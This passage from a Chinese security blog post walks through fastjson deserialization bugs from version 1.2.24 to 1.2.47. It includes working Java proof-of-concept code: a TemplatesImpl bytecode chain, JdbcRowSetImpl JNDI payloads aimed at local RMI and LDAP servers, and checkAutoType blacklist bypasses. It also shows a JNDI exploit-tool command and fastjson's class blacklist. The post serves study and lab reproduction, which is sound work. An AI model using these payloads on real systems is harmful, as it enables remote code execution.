java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Test extends AbstractTranslet &#123;</span><br><span class="line">    public Test() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;&#125;    </span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Test t = new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们定义Test类继承<code>AbstractTranslet</code>类，然后通过构造方法执行<code>calc</code>的命令。而下面两行的transform方法都是实现<code>AbstractTranslet</code>接口的抽象方法，具体来说的话，第一个<code>transform</code>带有<code>SerializationHandler</code>参数，是为了把<code>XML</code>文档转换为另一种格式，第二个<code>transform</code>带有<code>DTMAxisIterator</code>参数，是为了对<code>XML</code>文档中的节点进行迭代。</p>
<p>实际上就是我们<code>Test t = new Test();</code>实例化的时候，假装要把<code>xml</code>文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行<code>calc</code>，所以会弹出计算器。</p>
<p><strong>为什么要继承AbstractTranslet类</strong></p>
<p>在实战场景中，<code>Java</code>的<code>ClassLoader</code>类提供了<code>defineClass()</code>方法，可以把字节数组转换成<code>Java</code>类的示例，但是这里面的方法的作用域是被<code>Protected</code>修饰的，也就是说这个方法只能在<code>ClassLoader</code>类中访问，不能被其他包中的类访问</p>
<p>而由于我们前面编写的poc中两个<code>transform</code>方法都来自<code>AbstractTranslet</code>类，那么子类可以通过调用父类的公共方法来实现对私有属性的操作，这也能解释下面的链子是如何实现的</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205721063.png"></p>
<p>但是，我们注意到在<code>TransletClassLoader</code>类中，<code>defineClass</code>调用了<code>ClassLoader</code>里面的<code>defineClass</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205743267.png"></p>
<p>然后追踪<code>TransletClassLoader</code>，发现是<code>defineTransletClasses</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205812496.png"></p>
<p>再往上，发现是<code>getTransletInstance</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205823806.png"></p>
<p>到此为止，要么是<code>Private</code>修饰要么就是<code>Protected</code>修饰，再往上继续追踪，发现是<code>newTransformer</code>，可以看到此时已经是<code>public</code>了</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205839574.png"></p>
<p>因此，我们的利用链是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl::newTransformer() -&gt; TemplatesImpl::getTransletInstance() -&gt; TemplatesImpl::defineTransletClasses() -&gt; TransletClassLoader::defineClass()</span><br></pre></td></tr></table></figure>

<p>最终poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static class test&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        String randomClassName = &quot;rev1ve&quot; + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] evilCode = cc.toBytecode();</span><br><span class="line">            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line">            String text1 = &quot;&#123;&quot;+</span><br><span class="line">                    &quot;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +&quot;\&quot;,&quot;+</span><br><span class="line">                    &quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode_base64+&quot;\&quot;],&quot;+</span><br><span class="line">                    &quot;&#x27;_name&#x27;:&#x27;rev1ve&#x27;,&quot;+</span><br><span class="line">                    &quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;+</span><br><span class="line">                    &quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;+</span><br><span class="line">                    &quot;&#125;\n&quot;;</span><br><span class="line">            ParserConfig config = new ParserConfig();</span><br><span class="line">            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326131933212.png"></p>
<h3 id="fastjson-1-2-25-反序列化漏洞"><a href="#fastjson-1-2-25-反序列化漏洞" class="headerlink" title="fastjson 1.2.25 反序列化漏洞"></a>fastjson 1.2.25 反序列化漏洞</h3><p>（学习JdbcRowSetImpl链的相关知识）</p>
<h4 id="黑白名单机制介绍"><a href="#黑白名单机制介绍" class="headerlink" title="黑白名单机制介绍"></a>黑白名单机制介绍</h4><p>众所周知，在<code>fastjson</code>自爆<code>1.2.24</code>版本的反序列化漏洞后，<code>1.2.25</code>版本就加入了黑白名单机制。<br>例如我们更换<code>1.2.25</code>版本的<code>fastjson</code>，然后再去执行原来的<code>poc</code>会发现提示<code>autoType is not support</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225435561.png"></p>
<p>查看源码可以发现这里定义了反序列化类的黑名单</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225528275.png"></p>
<p>具体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>接下来我们定位到<code>checkAutoType()</code>方法，看一下它的逻辑。如果<code>autoType</code>（也就是autoTypeSupport）开启或者class对象不为空，那么先判断类名在不在白名单中，若有则<code>TypeUtils.loadClass</code>去加载，如果不在就去匹配黑名单</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225830172.png"></p>
<p>如果没开启<code>autoType</code>那么先匹配黑名单，然后再白名单匹配和加载</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225928936.png"></p>
<p>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230020115.png"></p>
<p>我们跟进下加载时的<code>loadClass</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230119890.png"></p>
<p>如果类名的字符串以<code>[</code>开头，则说明该类是一个数组类型，需要递归调用<code>loadClass</code>方法来加载数组元素类型对应的<code>Class</code>对象，然后使用<code>Array.newIntrance</code>方法来创建一个空数组对象，最后返回该数组对象的<code>Class</code>对象；如果类名的字符串以<code>L</code>开头并以<code>;</code>结尾，则说明该类是一个普通的<code>Java</code>类，需要把开头的<code>L</code>和结尾的<code>;</code>给去掉，然后递归调用<code>loadClass</code>。</p>
<h4 id="黑白名单绕过的复现（jkd版本问题未成功）"><a href="#黑白名单绕过的复现（jkd版本问题未成功）" class="headerlink" title="黑白名单绕过的复现（jkd版本问题未成功）"></a>黑白名单绕过的复现（jkd版本问题未成功）</h4><p>分析完后，复现绕过我们需要先开启默认禁用的<code>autoType</code>，这里我们添加代码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//以下两种都行</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;org.example.,org.javaweb.&quot;);</span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>然后启动利用工具 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">下载地址</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230459323.png"></p>
<p>在Main.java写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String payload = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;a\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +</span><br><span class="line">                &quot;    &#125;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;b\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/18zmzg\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;autoCommit\&quot;:true\n&quot; +</span><br><span class="line">                &quot;    &#125;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230642420.png"></p>
<h4 id="对两种poc绕过手法的分析"><a href="#对两种poc绕过手法的分析" class="headerlink" title="对两种poc绕过手法的分析"></a>对两种poc绕过手法的分析</h4><p>首先来说说限制，基于<code>JNDI+RMI</code>或<code>JDNI+LADP</code>进行攻击，会有一定的<code>JDK</code>版本限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113</span><br><span class="line">LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191</span><br></pre></td></tr></table></figure>

<p><strong>第一种poc（1.2.25-1.2.47通杀！！！）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1/exp&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第二种poc</strong></p>
<p>绕过检测<code>L</code>和<code>;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关于JdbcRowSetImpl链利用的分析"><a href="#关于JdbcRowSetImpl链利用的分析" class="headerlink" title="关于JdbcRowSetImpl链利用的分析"></a>关于JdbcRowSetImpl链利用的分析</h4><p>从上面我们学习了绕过黑白名单的学习，接下来看<code>JdbcRowSetImpl</code>利用链的原理。 根据<code>FastJson</code>反序列化漏洞原理，<code>FastJson</code>将<code>JSON</code>字符串反序列化到指定的<code>Java</code>类时，会调用目标类的<code>getter</code>、<code>setter</code>等方法。<code>JdbcRowSetImpl</code>类的<code>setAutoCommit()</code>会调用<code>connect()</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233254635.png"></p>
<p><code>connect()</code>函数如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233412606.png"></p>
<p>我们注意这两行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InitialContext var1 = new InitialContext();</span><br><span class="line">DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</span><br></pre></td></tr></table></figure>

<p>执行过程是从命名和目录服务中查找指定名称的数据源，并将其赋值给 <code>var2</code> 变量</p>
<p>我们可以用下面demo测试下，成功弹出计算器</p>
<figure class="highlight plaintext"><figcaption><span>org.example;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/ift2ty&quot;);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以说为什么之前的两种<code>poc</code>可以直接自定义<code>uri</code>利用成功。</p>
<h3 id="fastjson-1-2-42-反序列化漏洞"><a href="#fastjson-1-2-42-反序列化漏洞" class="headerlink" title="fastjson 1.2.42 反序列化漏洞"></a>fastjson 1.2.42 反序列化漏洞</h3><p>导入<code>fastjson 1.2.25</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_1_2_42&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.42&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>我们找到ParserConfig.class反编译一下得到java文件</p>
<p>注意到<code>checkAutoType</code>这里进行判断，仅仅是把原来的<code>L</code>和<code>;</code>换成了<code>hash</code>的形式</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326235721296.png"></p>
<p>所以直接双写<code>L</code>和<code>;</code>即可，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-43-反序列化漏洞"><a href="#fastjson-1-2-43-反序列化漏洞" class="headerlink" title="fastjson 1.2.43 反序列化漏洞"></a>fastjson 1.2.43 反序列化漏洞</h3><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.43</code>。 直接全局搜索<code>checkAutoType</code>，看修改后的代码</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240327000034710.png"></p>
<p>如果出现连续的两个<code>L</code>就报错，但是并没有对<code>[</code>限制，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-44-mappings缓存导致反序列化漏洞"><a href="#fastjson-1-2-44-mappings缓存导致反序列化漏洞" class="headerlink" title="fastjson 1.2.44 mappings缓存导致反序列化漏洞"></a>fastjson 1.2.44 mappings缓存导致反序列化漏洞</h3><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.44</code>。 这个版本的<code>fastjson</code>总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说<code>fastjson 1.2.25</code>版本的第一种<code>poc</code>的那个通过<code>mappings</code>缓存绕过<code>checkAutoType</code>的漏洞，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-47-mappings缓存导致反序列化漏洞"><a href="#fastjson-1-2-47-mappings缓存导致反序列化漏洞" class="headerlink" title="fastjson 1.2.47 mappings缓存导致反序列化漏洞"></a>fastjson 1.2.47 mappings缓存导致反序列化漏洞</h3><p>poc同上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"># java安全</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html" rel="prev" title="NKCTF 2024">
      <i class="fa fa-chevron-left"></i> NKCTF 2024
    </a></div>
      <div class="post-nav-item">
    <a href="/article/Headless-HackTheBox.html" rel="next" title="Headless">
      Headless <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
